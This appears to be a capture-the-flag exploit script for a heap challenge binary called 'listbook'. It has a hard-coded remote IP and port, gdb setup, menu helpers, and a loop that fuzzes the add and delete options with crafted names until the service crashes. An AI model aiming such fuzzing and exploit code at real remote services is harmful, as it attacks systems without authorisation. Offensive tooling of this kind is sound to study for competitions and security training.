#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
__MODE__="PWN"
from rootkit import *
exe = context.binary = ELF('./listbook')

host = args.HOST or '111.186.58.249'
port = int(args.PORT or 20001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
# b *0x555555555651
# b *0x55555555538f
# b *0x555555555568
set $name_buf = 0x555555558840
continue
'''.format(**locals())

# -- Exploit goes here --

"""
   0x55555555538f    movzx  eax, byte ptr sum_of_inp
   0x555555555393    sar    al, 7
   0x555555555396    mov    edx, eax
   0x555555555398    mov    eax, edx
 ► 0x55555555539a    xor    al, byte ptr sum_of_inp
   0x55555555539d    sub    eax, edx
   0x55555555539f    mov    byte ptr sum_of_inp, al
   0x5555555553a2    cmp    byte ptr sum_of_inp, 0xf
   0x5555555553a6    jle    0x5555555553be <0x5555555553be>

"""

def option(choice):
    sla(">>", str(choice))

def add(name, content):
    option(1)
    try:
        sla("name>", name)
    except:
        print(io.recv())
    try:
        sla("content>", content)
    except:
        print(io.recv())

def delete(idx):
    option(2)
    sla("index>", str(idx))

def show(idx):
    option(3)
    sla("index>", str(idx))
    print(rl())

def print_all():
    for i in range(16):
        show(i)
def delete_all():
    for i in range(16):
        delete(i)
import sys
sys.tracebacklimit = -1

io = start()
context.log_level = "critical"
while True:
    try:
        payload_len = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
        payload_len = random.choice(payload_len)
        while True:
            payload = "A"*14 + os.urandom(1).decode('latin-1')
            if "\n" not in payload:
                break
        content = os.urandom(1).decode('latin-1')
        success(f"add('{payload}', 'A'*0x200)")
        add(payload, "A"*0x200)
        success(f"delete({payload_len})")
        delete(payload_len)
    except :
        print("")
        warning("CRASH := " + io.recv().decode('latin-1'))
        exit(-1)
        io.close()
io.interactive()

